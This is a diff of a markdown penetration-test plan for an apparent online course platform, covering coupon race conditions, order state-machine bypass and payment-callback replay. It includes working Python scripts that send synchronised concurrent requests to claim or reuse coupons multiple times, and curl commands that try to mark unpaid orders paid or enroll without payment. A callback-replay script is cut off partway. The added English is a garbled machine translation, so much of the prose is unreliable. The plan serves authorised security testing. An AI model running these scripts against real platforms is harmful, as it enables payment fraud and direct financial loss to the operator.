@@ -1,139 +1,139 @@
-# 在线教育平台 — 竞态条件与状态机漏洞专项测试方案
+# inline lesson Platform - Race ConditionandStatusmachine vulnerability specialitemsTest Plan
 
-> 基于 WooYun 22,132 个真实漏洞案例方法论 | 聚焦逻辑流领域（1,679 案例）与金融领域（2,919 案例）
-
----
-
-## 一、目标系统业务流程映射
-
-### 1.1 优惠券领取流程
-
-```
-状态机：
-  [未领取] → 用户点击领取 → [检查是否已领] → [写入领取记录] → [已领取]
-
-关键检查-行动模式（TOCTOU 风险点）：
-  检查(user_id, coupon_id) → 无记录 → 插入记录
-  ↑ 竞态窗口：检查与插入之间无原子保证
-```
-
-### 1.2 课程购买流程
-
-```
-预期状态机：
-  [浏览] → [加入购物车] → [创建订单/待支付] → [发起支付] → [支付回调/已支付] → [开通课程/已完成]
-
-可能的非法状态转移：
-  [待支付] → [已完成]      # 跳过支付直接开通
-  [已完成] → [待支付]      # 逆向回退重新利用优惠
-  [已支付] → [已退款] → 课程仍可访问   # 退款不回收权限
-  [待支付] → 修改订单内容 → [已支付]   # 支付前篡改订单
-```
+> Based on the methodology from 22,132 real WooYun vulnerability cases | Logic Flow Domain(1,679 Case)andFinancial Domain(2,919 Case)
 
 ---
 
-## 二、威胁假设（基于 WooYun 模式匹配）
+## 1. TargetSystembusiness flow process map map
 
-### 假设 H1：优惠券领取存在竞态条件（TOCTOU）
+### 1.1 Coupondomain take flow process
 
-| 维度 | 内容 |
-|------|------|
-| **WooYun 模式** | 竞态条件/TOCTOU — 266 个案例，74.8% 高危 |
-| **攻击原理** | 多个并发请求同时通过"是否已领"检查，均在写入记录前判定为"未领取"，导致同一用户领取多张 |
-| **类比案例** | WooYun 优惠券竞速模式：并行应用同一单次使用优惠券（金融领域 1,056 案例中的典型子类） |
-| **影响** | 单用户无限领券 → 批量套利 → 平台直接经济损失 |
-| **根因** | `SELECT → 判断 → INSERT` 三步非原子，缺乏数据库级唯一约束或分布式锁 |
+```
+Statusmachine:
+ [not domain take] -> Userpoint attack domain take -> [Checkwhetheralready domain] -> [write inject domain takeRecord] -> [already domain take]
 
-### 假设 H2：订单状态机可被强制跳转
+keyCheck-linesdynamic mode(TOCTOU risk point):
+ Check(user_id, coupon_id) -> noRecord -> injectRecord
+ up Racewindow interface:Checkand inject between no principle sub protect cert
+```
 
-| 维度 | 内容 |
-|------|------|
-| **WooYun 模式** | 状态机绕过 — 1,391 个案例，65.3% 高危 |
-| **攻击原理** | 直接调用"开通课程"接口或篡改订单状态参数，跳过支付步骤 |
-| **类比案例** | 「M1905电影网价值2588套餐只要5毛钱」— 通过后台自批准绕过支付；「114票务网某站逻辑漏洞利用支付超时导致上万用户敏感信息泄漏」— 超时状态机缺陷 |
-| **影响** | 免费获取付费课程，平台课程收入归零 |
-| **根因** | 服务端未校验状态前置条件，或状态转移逻辑仅在前端控制 |
+### 1.2 lesson process buy buy flow process
 
-### 假设 H3：支付回调可重放/伪造
+```
+expected periodStatusmachine:
+ [] -> [add injectShopping Cart] -> [Create Order/Pending Payment] -> [initiate initiatePayment] -> [PaymentCallback/Paid] -> [open wild lesson process/Completed]
 
-| 维度 | 内容 |
-|------|------|
-| **WooYun 模式** | 订单篡改 — 1,227 个案例，74.2% 高危 |
-| **攻击原理** | 捕获一次成功的支付回调请求，对不同订单重放，或伪造回调签名 |
-| **类比案例** | WooYun 金融领域：「重放成功的支付/充值回调」为高频攻击向量 |
-| **影响** | 一次真实支付 → 无限开通课程 |
-
-### 假设 H4：订单内容支付后可篡改
-
-| 维度 | 内容 |
-|------|------|
-| **WooYun 模式** | 业务规则绕过 — 266 个案例 |
-| **攻击原理** | 创建低价课程订单 → 支付 → 在回调到达前将订单课程ID替换为高价课程 |
-| **类比案例** | 「大特宝官网业务逻辑漏洞可免费甚至低款买保险」— 支付金额与实际商品不匹配 |
-| **影响** | 低价购买高价课程 |
-
-### 假设 H5：优惠券可跨订单/堆叠使用
-
-| 维度 | 内容 |
-|------|------|
-| **WooYun 模式** | 支付篡改/折扣滥用 — 1,056 案例中的子类 |
-| **攻击原理** | 同一优惠券应用到多个订单；多张优惠券堆叠使价格降至 0 |
-| **影响** | 课程实际支付金额为零或极低 |
+CancanofNon-methodStatustransfer move:
+ [Pending Payment] -> [Completed] # skip throughPaymentDirectopen wild
+ [Completed] -> [Pending Payment] # toward return refund serious new exploitusepriority
+ [Paid] -> [Refunded] -> lesson process stillCanaccess ask # Refundnot return collectPermission
+ [Pending Payment] -> ModifyOrdercontent -> [Paid] # Paymentfirst tamper changeOrder
+```
 
 ---
 
-## 三、测试环境与工具准备
+## 2. false set(based on WooYun mode match config)
 
-### 3.1 账号准备
+### false set H1:Coupondomain take existinRace Condition(TOCTOU)
 
-| 角色 | 数量 | 用途 |
+| Dimension | content |
+|------|------|
+| **WooYun mode** | Race Condition/TOCTOU - 266 Case, 74.8% High Risk |
+| **Attack Principle** | manyConcurrencyRequestsame timePass"whetheralready domain"Check, averageinwrite injectRecordfirst determine setas"not domain take", CausingSameUserdomain take manyitems |
+| **type ratioCase** | WooYun Coupon rate mode:andlinesApplicationSamesingletimesuseuseCoupon(Financial Domain 1,056 Caseinof type sub type) |
+| **impact response** | singleUserno limit domain coupon -> Batch exploit -> PlatformDirectfinancial loss |
+| **root because** | `SELECT -> determine judge -> INSERT` three stepNon-principle sub, missing Databaselevel unique constraintorDistributed Lock |
+
+### false set H2:Order State MachineCanbe strong make skip transfer
+
+| Dimension | content |
+|------|------|
+| **WooYun mode** | State-Machine Bypass - 1,391 Case, 65.3% High Risk |
+| **Attack Principle** | Direct Call"open wild lesson process"Interfaceortamper changeOrderStatusParameter, skip throughPaymentStep |
+| **type ratioCase** | "M1905Movie site value2588Packageonly costs5jiao" - Passbackend console self batch accurateBypassPayment;"114Ticketing site logic flaw used payment timeout to leak sensitive information for tens of thousands of users" - super timeStatusmachine missing flaw |
+| **impact response** | avoid feeObtainpaid lesson process, Platformlesson process collect inject return zero |
+| **root because** | ServernotValidateStatusPrerequisites, orStatustransfer move logic logic onlyinFrontendcontrol make |
+
+### false set H3:PaymentCallbackCanReplay/forgery
+
+| Dimension | content |
+|------|------|
+| **WooYun mode** | Order Tampering - 1,227 Case, 74.2% High Risk |
+| **Attack Principle** | onetimesSuccessofPaymentCallbackRequest, forDifferentOrderReplay, orforgeryCallbackSignature |
+| **type ratioCase** | WooYun Financial Domain:"ReplaySuccessofPayment/Top-UpCallback"asHighfrequencyAttack Vector |
+| **impact response** | onetimesreal realPayment -> no limit open wild lesson process |
+
+### false set H4:OrdercontentPaymentafterCantamper change
+
+| Dimension | content |
+|------|------|
+| **WooYun mode** | Business Rule Bypass - 266 Case |
+| **Attack Principle** | CreateLowprice lesson processOrder -> Payment -> inCallbacktoreach firstwillOrderlesson processIDReplaceasHighprice lesson process |
+| **type ratioCase** | "Datebao official site business-logic vulnerability allowed buying insurance for free or at an extremely low price" - PaymentAmountandreal actual commerce product not match config |
+| **impact response** | Lowprice buy buyHighprice lesson process |
+
+### false set H5:CouponCancrossOrder/stack useuse
+
+| Dimension | content |
+|------|------|
+| **WooYun mode** | Payment Tampering/discount deduct abuseuse - 1,056 Caseinofsub type |
+| **Attack Principle** | SameCouponApplicationtomanyOrder;manyitemsCouponstack use price format 0 |
+| **impact response** | lesson process real actualPaymentAmountaszeroorextremeLow |
+
+---
+
+## 3. Test EnvironmentandTool Preparation
+
+### 3.1 Accountaccurate prepare
+
+| Role | number quantity | Purpose |
 |------|------|------|
-| 普通学生账号 | 3 个 | 并发测试、水平越权测试 |
-| 教师/管理员账号 | 1 个 | 垂直权限测试 |
-| 新注册账号 | 2 个 | 优惠券首次领取测试 |
+| wild generateAccount | 3 | Concurrencytest/Horizontal Authorization Bypasstest |
+| lesson /AdministratorAccount | 1 | vertical verticalPermissiontest |
+| newRegistrationAccount | 2 | Coupontimesdomain take test |
 
-### 3.2 工具清单
+### 3.2 Toolclear single
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| Burp Suite + Turbo Intruder | 请求拦截、并发竞态测试 |
-| Python `asyncio` + `aiohttp` | 自定义并发测试脚本 |
-| mitmproxy | 支付回调拦截与重放 |
-| curl | 快速接口验证 |
+| Burp Suite + Turbo Intruder | Request Interception/ConcurrencyRacetest |
+| Python `asyncio` + `aiohttp` | self set defineConcurrencytestScript |
+| mitmproxy | PaymentCallbackInterceptandReplay |
+| curl | fast rateInterfaceValidate |
 
 ---
 
-## 四、测试用例详细设计
+## 4. Test CaseDetailedset plan
 
-### 4.1 竞态条件测试 — 优惠券领取（H1）
+### 4.1 Race Conditiontest - Coupondomain take(H1)
 
-#### TC-RACE-01：基础并发领券
+#### TC-RACE-01:base foundationConcurrencydomain coupon
 
-**目标：** 验证同一用户能否通过并发请求领取多张限领一张的优惠券
+**Target:** ValidateSameUserwhether canPassConcurrencyRequestdomain take manyitemslimit domain oneitemsofCoupon
 
-**前置条件：**
-- 用户 A 未领取目标优惠券
-- 优惠券规则为"每人限领一张"
+**Prerequisites:**
+- User A not domain takeTargetCoupon
+- Couponscale ruleas"each person limit domain oneitems"
 
-**测试步骤：**
+**Test Steps:**
 
-1. 登录用户 A，获取有效 session/token
-2. 抓取领取优惠券的 HTTP 请求（含完整 headers、cookies、body）
-3. 使用并发脚本同时发送 20 个相同的领取请求
-4. 检查响应：统计成功响应数量
-5. 检查数据库/接口：用户 A 实际持有的该优惠券数量
+1. LoginUser A, ObtainValid session/token
+2. capture take domain takeCouponof HTTP Request(includeComplete headers/cookies/body)
+3. useuseConcurrencyScriptsame timeSend 20 related sameofdomain takeRequest
+4. CheckResponse:StatisticsSuccessResponsenumber quantity
+5. CheckDatabase/Interface:User A real actual hold hasofthisCouponnumber quantity
 
-**预期结果：** 仅 1 个请求成功，其余 19 个返回"已领取"错误
+**Expected Result:** only 1 RequestSuccess, other 19 Return"already domain take"error
 
-**漏洞判定：** 2 个或以上请求返回成功，或用户持有 2 张以上该优惠券
+**vulnerability determine set:** 2 oror moreRequestReturnSuccess, orUserhold has 2 itemsor morethisCoupon
 
-**并发测试脚本：**
+**ConcurrencytestScript:**
 
 ```python
 #!/usr/bin/env python3
 """
-优惠券竞态条件测试脚本
-WooYun 模式：TOCTOU（266案例，74.8%高危）
+CouponRace ConditiontestScript
+WooYun mode:TOCTOU(266Case, 74.8%High Risk)
 """
 
 import asyncio
@@ -142,119 +142,112 @@ import time
 import json
 from collections import Counter
 
-# ===== 配置区域 =====
+# ===== Configuration domain =====
 TARGET_URL = "https://edu-platform.example.com/api/coupon/claim"
-CONCURRENT_REQUESTS = 20  # 并发数，建议 10-30
-COUPON_ID = "COUPON_001"  # 目标优惠券ID
+CONCURRENT_REQUESTS = 20 # Concurrencynumber, create protocol 10-30
+COUPON_ID = "COUPON_001" # TargetCouponID
 
 HEADERS = {
-    "Content-Type": "application/json",
-    "Authorization": "Bearer <USER_A_TOKEN>",  # 替换为实际token
-    "Cookie": "<USER_A_COOKIE>",               # 替换为实际cookie
+ "Content-Type": "application/json",
+ "Authorization": "Bearer <USER_A_TOKEN>", # Replaceasreal actualtoken
+ "Cookie": "<USER_A_COOKIE>", # Replaceasreal actualcookie
 }
 
 PAYLOAD = {
-    "coupon_id": COUPON_ID,
+ "coupon_id": COUPON_ID,
 }
 # ====================
 
-
 async def claim_coupon(session: aiohttp.ClientSession, req_id: int,
-                       barrier: asyncio.Barrier):
-    """单个领取请求，使用 barrier 确保所有协程同时发出"""
-    await barrier.wait()  # 所有协程在此同步，然后同时放行
-    timestamp = time.time()
-    try:
-        async with session.post(TARGET_URL, json=PAYLOAD,
-                                headers=HEADERS, ssl=False) as resp:
-            status = resp.status
-            body = await resp.text()
-            elapsed = time.time() - timestamp
-            return {
-                "req_id": req_id,
-                "status": status,
-                "body": body[:500],
-                "elapsed_ms": round(elapsed * 1000, 2),
-                "timestamp": timestamp,
-            }
-    except Exception as e:
-        return {
-            "req_id": req_id,
-            "status": -1,
-            "body": str(e),
-            "elapsed_ms": -1,
-            "timestamp": timestamp,
-        }
-
+ barrier: asyncio.Barrier):
+ """single domain takeRequest, useuse barrier confirm protectAllprotocol process same time initiate out"""
+ await barrier.wait() # Allprotocol processin same step, after same time releaselines
+ timestamp = time.time()
+ try:
+ async with session.post(TARGET_URL, json=PAYLOAD,
+ headers=HEADERS, ssl=False) as resp:
+ status = resp.status
+ body = await resp.text()
+ elapsed = time.time() - timestamp
+ return {
+ "req_id": req_id,
+ "status": status,
+ "body": body[:500],
+ "elapsed_ms": round(elapsed * 1000, 2),
+ "timestamp": timestamp,
+ }
+ except Exception as e:
+ return {
+ "req_id": req_id,
+ "status": -1,
+ "body": str(e),
+ "elapsed_ms": -1,
+ "timestamp": timestamp,
+ }
 
 async def main():
-    print(f"[*] 优惠券竞态条件测试")
-    print(f"[*] 目标: {TARGET_URL}")
-    print(f"[*] 并发数: {CONCURRENT_REQUESTS}")
-    print(f"[*] 优惠券ID: {COUPON_ID}")
-    print("-" * 60)
+ print(f"[*] CouponRace Conditiontest")
+ print(f"[*] Target: {TARGET_URL}")
+ print(f"[*] Concurrencynumber: {CONCURRENT_REQUESTS}")
+ print(f"[*] CouponID: {COUPON_ID}")
+ print("-" * 60)
 
-    barrier = asyncio.Barrier(CONCURRENT_REQUESTS)
+ barrier = asyncio.Barrier(CONCURRENT_REQUESTS)
 
-    connector = aiohttp.TCPConnector(
-        limit=0,              # 不限制连接数
-        force_close=True,     # 每次新建连接，避免连接复用导致串行
-    )
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [
-            claim_coupon(session, i, barrier)
-            for i in range(CONCURRENT_REQUESTS)
-        ]
-        results = await asyncio.gather(*tasks)
+ connector = aiohttp.TCPConnector(limit=0, # not limit make continuous connect number
+ force_close=True, # eachtimesnew create continuous connect, avoid continuous connect repeatuseCausingstringlines)
+ async with aiohttp.ClientSession(connector=connector) as session:
+ tasks = [claim_coupon(session, i, barrier)
+ for i in range(CONCURRENT_REQUESTS)]
+ results = await asyncio.gather(*tasks)
 
-    # ===== 结果分析 =====
-    print("\n[*] 请求结果：")
-    status_counter = Counter()
-    success_count = 0
+ # ===== ResultAnalyze =====
+ print("\n[*] RequestResult:")
+ status_counter = Counter()
+ success_count = 0
 
-    for r in sorted(results, key=lambda x: x["timestamp"]):
-        is_success = r["status"] == 200 and "success" in r["body"].lower()
-        status_counter[r["status"]] += 1
-        if is_success:
-            success_count += 1
-        flag = "<<< SUCCESS" if is_success else ""
-        print(f"  [req {r['req_id']:2d}] HTTP {r['status']} | "
-              f"{r['elapsed_ms']:7.2f}ms | {flag}")
+ for r in sorted(results, key=lambda x: x["timestamp"]):
+ is_success = r["status"] == 200 and "success" in r["body"].lower()
+ status_counter[r["status"]] += 1
+ if is_success:
+ success_count += 1
+ flag = "<<< SUCCESS" if is_success else ""
+ print(f" [req {r['req_id']:2d}] HTTP {r['status']} | "
+ f"{r['elapsed_ms']:7.2f}ms | {flag}")
 
-    print("-" * 60)
-    print(f"[*] HTTP 状态码分布: {dict(status_counter)}")
-    print(f"[*] 成功领取次数: {success_count}")
+ print("-" * 60)
+ print(f"[*] HTTP Statuscode part deploy: {dict(status_counter)}")
+ print(f"[*] Successdomain taketimesnumber: {success_count}")
 
-    if success_count > 1:
-        print(f"\n[!!!] 漏洞确认：存在竞态条件！")
-        print(f"      用户成功领取了 {success_count} 张优惠券（限领1张）")
-        print(f"      WooYun 模式: TOCTOU 竞态条件")
-        print(f"      严重级别: 高危（参考 WooYun 266案例，74.8%高危）")
-    elif success_count == 1:
-        print(f"\n[OK] 未发现竞态条件，仅 1 次领取成功")
-    else:
-        print(f"\n[?] 无成功请求，请检查认证信息和接口地址")
-
+ if success_count > 1:
+ print(f"\n[!!!] Vulnerability Confirmation:existinRace Condition!")
+ print(f" UserSuccessdomain take done {success_count} itemsCoupon(limit domain1items)")
+ print(f" WooYun mode: TOCTOU Race Condition")
+ print(f" Severity: High Risk(participate reference WooYun 266Case, 74.8%High Risk)")
+ elif success_count == 1:
+ print(f"\n[OK] notDiscoverRace Condition, only 1 timesdomain takeSuccess")
+ else:
+ print(f"\n[?] noSuccessRequest, pleaseCheckAuthenticationinformationandInterfaceAddress")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+ asyncio.run(main())
 ```
 
-#### TC-RACE-02：多用户并发抢券（库存竞态）
+#### TC-RACE-02:manyUserConcurrency coupon(InventoryRace)
 
-**目标：** 验证限量优惠券（如总共 100 张）能否被超额领取
+**Target:** Validatelimit quantityCoupon(such astotal total 100 items)whether canbe super amount domain take
 
-**步骤：**
+**Step:**
 
-1. 准备一个总量为 N 张的限量优惠券
-2. 使用 M 个不同用户账号（M > N）同时发送领取请求
-3. 检查实际发放数量是否超过 N
+1. accurate prepare one total quantityas N itemsoflimit quantityCoupon
+2. useuse M DifferentUserAccount(M > N)same timeSenddomain takeRequest
+3. Checkreal actual initiate release number quantitywhethersuper through N
 
 ```python
 #!/usr/bin/env python3
 """
-限量优惠券库存竞态测试
-验证总量限制是否为原子操作
+limit quantityCouponInventoryRacetest
+Validatetotal quantity limit makewhether isprinciple sub operation
 """
 
 import asyncio
@@ -263,76 +256,69 @@ import time
 
 TARGET_URL = "https://edu-platform.example.com/api/coupon/claim"
 COUPON_ID = "LIMITED_COUPON_001"
-COUPON_TOTAL = 10  # 优惠券总量
+COUPON_TOTAL = 10 # Coupontotal quantity
 
-# 准备多个用户的 token（替换为实际值）
-USER_TOKENS = [
-    "Bearer token_user_01",
-    "Bearer token_user_02",
-    # ... 准备 15-20 个用户token（超过优惠券总量）
-]
-
+# accurate prepare manyUserof token(Replaceasreal actual value)
+USER_TOKENS = ["Bearer token_user_01",
+ "Bearer token_user_02",
+ #... accurate prepare 15-20 Usertoken(super throughCoupontotal quantity)]
 
 async def claim_as_user(session, user_idx, token, barrier):
-    """以特定用户身份领取"""
-    headers = {
-        "Content-Type": "application/json",
-        "Authorization": token,
-    }
-    payload = {"coupon_id": COUPON_ID}
+ """as special setUseridentity copy domain take"""
+ headers = {
+ "Content-Type": "application/json",
+ "Authorization": token,
+ }
+ payload = {"coupon_id": COUPON_ID}
 
-    await barrier.wait()
-    ts = time.time()
-    try:
-        async with session.post(TARGET_URL, json=payload,
-                                headers=headers, ssl=False) as resp:
-            return {
-                "user": user_idx,
-                "status": resp.status,
-                "body": (await resp.text())[:300],
-                "ts": ts,
-            }
-    except Exception as e:
-        return {"user": user_idx, "status": -1, "body": str(e), "ts": ts}
-
+ await barrier.wait()
+ ts = time.time()
+ try:
+ async with session.post(TARGET_URL, json=payload,
+ headers=headers, ssl=False) as resp:
+ return {
+ "user": user_idx,
+ "status": resp.status,
+ "body": (await resp.text())[:300],
+ "ts": ts,
+ }
+ except Exception as e:
+ return {"user": user_idx, "status": -1, "body": str(e), "ts": ts}
 
 async def main():
-    n_users = len(USER_TOKENS)
-    print(f"[*] 库存竞态测试: {n_users} 用户抢 {COUPON_TOTAL} 张券")
+ n_users = len(USER_TOKENS)
+ print(f"[*] InventoryRacetest: {n_users} User {COUPON_TOTAL} itemscoupon")
 
-    barrier = asyncio.Barrier(n_users)
-    connector = aiohttp.TCPConnector(limit=0, force_close=True)
+ barrier = asyncio.Barrier(n_users)
+ connector = aiohttp.TCPConnector(limit=0, force_close=True)
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [
-            claim_as_user(session, i, token, barrier)
-            for i, token in enumerate(USER_TOKENS)
-        ]
-        results = await asyncio.gather(*tasks)
+ async with aiohttp.ClientSession(connector=connector) as session:
+ tasks = [claim_as_user(session, i, token, barrier)
+ for i, token in enumerate(USER_TOKENS)]
+ results = await asyncio.gather(*tasks)
 
-    success = [r for r in results if r["status"] == 200
-               and "success" in r["body"].lower()]
-    print(f"\n[*] 成功领取: {len(success)} / {n_users} 个用户")
-    print(f"[*] 优惠券总量: {COUPON_TOTAL}")
+ success = [r for r in results if r["status"] == 200
+ and "success" in r["body"].lower()]
+ print(f"\n[*] Successdomain take: {len(success)} / {n_users} User")
+ print(f"[*] Coupontotal quantity: {COUPON_TOTAL}")
 
-    if len(success) > COUPON_TOTAL:
-        print(f"\n[!!!] 漏洞确认：库存超卖！")
-        print(f"      发放 {len(success)} 张，超过限额 {COUPON_TOTAL} 张")
-
+ if len(success) > COUPON_TOTAL:
+ print(f"\n[!!!] Vulnerability Confirmation:Inventorysuper!")
+ print(f" initiate release {len(success)} items, super through limit amount {COUPON_TOTAL} items")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+ asyncio.run(main())
 ```
 
-#### TC-RACE-03：重复使用优惠券竞态
+#### TC-RACE-03:serious repeat useuseCouponRace
 
-**目标：** 验证单次使用优惠券能否通过并发请求在多个订单中使用
+**Target:** ValidatesingletimesuseuseCouponwhether canPassConcurrencyRequestinmanyOrderinuseuse
 
 ```python
 #!/usr/bin/env python3
 """
-优惠券使用竞态测试
-WooYun 模式：双花（金融领域高频攻击向量）
+CouponuseuseRacetest
+WooYun mode:dual flower(Financial DomainHighfrequencyAttack Vector)
 """
 
 import asyncio
@@ -341,253 +327,246 @@ import aiohttp
 TARGET_URL = "https://edu-platform.example.com/api/order/apply-coupon"
 COUPON_CODE = "SINGLE_USE_CODE"
 
-# 预先创建多个待支付订单
+# expected firstCreatemanyPending PaymentOrder
 ORDER_IDS = ["ORDER_001", "ORDER_002", "ORDER_003", "ORDER_004", "ORDER_005"]
 
 HEADERS = {
-    "Content-Type": "application/json",
-    "Authorization": "Bearer <USER_TOKEN>",
+ "Content-Type": "application/json",
+ "Authorization": "Bearer <USER_TOKEN>",
 }
 
-
 async def apply_coupon(session, order_id, barrier):
-    payload = {"order_id": order_id, "coupon_code": COUPON_CODE}
-    await barrier.wait()
-    async with session.post(TARGET_URL, json=payload,
-                            headers=HEADERS, ssl=False) as resp:
-        body = await resp.text()
-        return {"order_id": order_id, "status": resp.status, "body": body[:300]}
-
+ payload = {"order_id": order_id, "coupon_code": COUPON_CODE}
+ await barrier.wait()
+ async with session.post(TARGET_URL, json=payload,
+ headers=HEADERS, ssl=False) as resp:
+ body = await resp.text()
+ return {"order_id": order_id, "status": resp.status, "body": body[:300]}
 
 async def main():
-    n = len(ORDER_IDS)
-    print(f"[*] 优惠券双花测试: 1张券 → {n} 个订单")
+ n = len(ORDER_IDS)
+ print(f"[*] Coupondual flower test: 1itemscoupon -> {n} Order")
 
-    barrier = asyncio.Barrier(n)
-    connector = aiohttp.TCPConnector(limit=0, force_close=True)
+ barrier = asyncio.Barrier(n)
+ connector = aiohttp.TCPConnector(limit=0, force_close=True)
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [apply_coupon(session, oid, barrier) for oid in ORDER_IDS]
-        results = await asyncio.gather(*tasks)
+ async with aiohttp.ClientSession(connector=connector) as session:
+ tasks = [apply_coupon(session, oid, barrier) for oid in ORDER_IDS]
+ results = await asyncio.gather(*tasks)
 
-    success = [r for r in results if r["status"] == 200
-               and "success" in r["body"].lower()]
-    print(f"[*] 优惠券成功应用到 {len(success)} 个订单")
+ success = [r for r in results if r["status"] == 200
+ and "success" in r["body"].lower()]
+ print(f"[*] CouponSuccessApplicationto {len(success)} Order")
 
-    if len(success) > 1:
-        print(f"[!!!] 漏洞确认：优惠券双花！单次使用券被用于 {len(success)} 个订单")
-        for s in success:
-            print(f"      - 订单 {s['order_id']}")
-
+ if len(success) > 1:
+ print(f"[!!!] Vulnerability Confirmation:Coupondual flower!singletimesuseusecoupon beusefor {len(success)} Order")
+ for s in success:
+ print(f" - Order {s['order_id']}")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+ asyncio.run(main())
 ```
 
 ---
 
-### 4.2 状态机漏洞测试 — 课程购买流程（H2/H3/H4）
+### 4.2 Statusmachine vulnerability test - lesson process buy buy flow process(H2/H3/H4)
 
-#### TC-STATE-01：跳过支付直接开通课程
+#### TC-STATE-01:skip throughPaymentDirectopen wild lesson process
 
-**WooYun 模式：** 状态机绕过（1,391 案例，65.3% 高危）
-**类比案例：** 购物车 → 已完成（完全跳过支付）
+**WooYun mode:** State-Machine Bypass(1,391 Case, 65.3% High Risk)
+**type ratioCase:** Shopping Cart -> Completed(complete all skip throughPayment)
 
-**测试步骤：**
+**Test Steps:**
 
-1. 正常流程创建订单，记录订单号
-2. 不进行支付，直接调用以下接口（逐一尝试）：
-   - `POST /api/order/confirm` — 传入订单号
-   - `POST /api/order/complete` — 传入订单号
-   - `PUT /api/order/{id}/status` — body: `{"status": "paid"}`
-   - `POST /api/course/enroll` — 直接传课程ID
-3. 检查课程是否已开通
+1. correct common flow processCreate Order, RecordOrdernumber
+2. not advancelinesPayment, Direct Callthe followingInterface(one by oneAttempt):
+ - `POST /api/order/confirm` - pass injectOrdernumber
+ - `POST /api/order/complete` - pass injectOrdernumber
+ - `PUT /api/order/{id}/status` - body: `{"status": "paid"}`
+ - `POST /api/course/enroll` - Directpass lesson processID
+3. Checklesson processwhetheralready open wild
 
 ```bash
 #!/bin/bash
-# 状态机跳步测试 — 跳过支付直接确认订单
+# Statusmachine skip step test - skip throughPaymentDirectConfirmOrder
 
 BASE_URL="https://edu-platform.example.com/api"
 TOKEN="Bearer <USER_TOKEN>"
 ORDER_ID="<UNPAID_ORDER_ID>"
 
-echo "[*] TC-STATE-01: 跳过支付直接确认订单"
+echo "[*] TC-STATE-01: skip throughPaymentDirectConfirmOrder"
 echo "========================================="
 
-# 尝试1: 直接确认订单
+# Attempt1: DirectConfirmOrder
 echo -e "\n[1] POST /order/confirm"
 curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
-  -X POST "$BASE_URL/order/confirm" \
-  -H "Authorization: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d "{\"order_id\": \"$ORDER_ID\"}"
+ -X POST "$BASE_URL/order/confirm" \
+ -H "Authorization: $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d "{\"order_id\": \"$ORDER_ID\"}"
 
-# 尝试2: 直接修改订单状态为已支付
-echo -e "\n[2] PUT /order/$ORDER_ID/status → paid"
+# Attempt2: DirectModifyOrderStatusasPaid
+echo -e "\n[2] PUT /order/$ORDER_ID/status -> paid"
 curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
-  -X PUT "$BASE_URL/order/$ORDER_ID/status" \
-  -H "Authorization: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"status": "paid"}'
+ -X PUT "$BASE_URL/order/$ORDER_ID/status" \
+ -H "Authorization: $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"status": "paid"}'
 
-# 尝试3: 直接调用课程开通接口
-echo -e "\n[3] POST /course/enroll (绕过订单)"
+# Attempt3: Direct Calllesson process open wildInterface
+echo -e "\n[3] POST /course/enroll (BypassOrder)"
 curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
-  -X POST "$BASE_URL/course/enroll" \
-  -H "Authorization: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"course_id": "<COURSE_ID>"}'
+ -X POST "$BASE_URL/course/enroll" \
+ -H "Authorization: $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"course_id": "<COURSE_ID>"}'
 
-# 验证: 检查课程是否已开通
-echo -e "\n[*] 验证课程状态:"
+# Validate: Checklesson processwhetheralready open wild
+echo -e "\n[*] Validatelesson processStatus:"
 curl -s "$BASE_URL/user/courses" \
-  -H "Authorization: $TOKEN" | python3 -m json.tool
+ -H "Authorization: $TOKEN" | python3 -m json.tool
 ```
 
-#### TC-STATE-02：支付回调重放
+#### TC-STATE-02:PaymentCallbackReplay
 
-**WooYun 模式：** 订单篡改（1,227 案例，74.2% 高危）
+**WooYun mode:** Order Tampering(1,227 Case, 74.2% High Risk)
 
-**测试步骤：**
+**Test Steps:**
 
-1. 完成一笔真实的低价课程支付
-2. 使用 mitmproxy/Burp 捕获支付网关回调请求
-3. 修改回调中的 `order_id` 为另一个未支付订单
-4. 重放修改后的回调请求
-5. 检查新订单是否变为已支付
+1. complete one entry real realofLowprice lesson processPayment
+2. useuse mitmproxy/Burp Payment GatewayCallbackRequest
+3. ModifyCallbackinof `order_id` as one notPaymentOrder
+4. ReplayModifyafterofCallbackRequest
+5. ChecknewOrderwhetherchangeasPaid
 
 ```python
 #!/usr/bin/env python3
 """
-支付回调重放测试
-WooYun 模式：订单篡改 — 对不同订单重放成功的支付回调
+PaymentCallbackReplaytest
+WooYun mode:Order Tampering - forDifferentOrderReplaySuccessofPaymentCallback
 """
 
 import requests
 import copy
 import hashlib
 
-# ===== 配置 =====
+# ===== Configuration =====
 CALLBACK_URL = "https://edu-platform.example.com/api/payment/callback"
 
-# 从 Burp/mitmproxy 捕获的真实成功回调（替换为实际值）
+# from Burp/mitmproxy ofreal realSuccessCallback(Replaceasreal actual value)
 ORIGINAL_CALLBACK = {
-    "order_id": "PAID_ORDER_001",
-    "amount": "99.00",
-    "status": "SUCCESS",
-    "transaction_id": "TXN_ABC123",
-    "sign": "original_signature_here",  # 支付网关签名
-    "timestamp": "1709712000",
+ "order_id": "PAID_ORDER_001",
+ "amount": "99.00",
+ "status": "SUCCESS",
+ "transaction_id": "TXN_ABC123",
+ "sign": "original_signature_here", # Payment GatewaySignature
+ "timestamp": "1709712000",
 }
 
-# 要攻击的未支付订单
-TARGET_ORDER_IDS = [
-    "UNPAID_ORDER_002",
-    "UNPAID_ORDER_003",
-]
+# need attack attackofnotPaymentOrder
+TARGET_ORDER_IDS = ["UNPAID_ORDER_002",
+ "UNPAID_ORDER_003",]
 # =================
 
 TOKEN = "Bearer <USER_TOKEN>"
 
-
 def test_callback_replay():
-    print("[*] TC-STATE-02: 支付回调重放测试\n")
+ print("[*] TC-STATE-02: PaymentCallbackReplaytest\n")
 
-    # 测试1：原样重放（检查幂等性）
